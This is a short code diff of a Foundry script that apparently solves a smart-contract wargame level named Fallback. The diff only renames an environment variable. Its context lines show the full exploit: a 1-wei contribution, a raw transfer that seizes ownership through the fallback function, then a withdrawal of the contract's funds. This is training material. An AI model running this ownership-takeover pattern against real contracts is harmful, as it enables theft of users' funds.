@@ -15,7 +15,7 @@ contract FallbackSolution is Script {
         fallbackInstance.contribute{value: 1 wei}();
         address(fallbackInstance).call{value: 1 wei}("");
         console.log("New Owner: ", fallbackInstance.owner());
-        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
+        console.log("My Address: ", vm.envAddress("ADDRESS"));
         fallbackInstance.withdraw();
         
         vm.stopBroadcast();
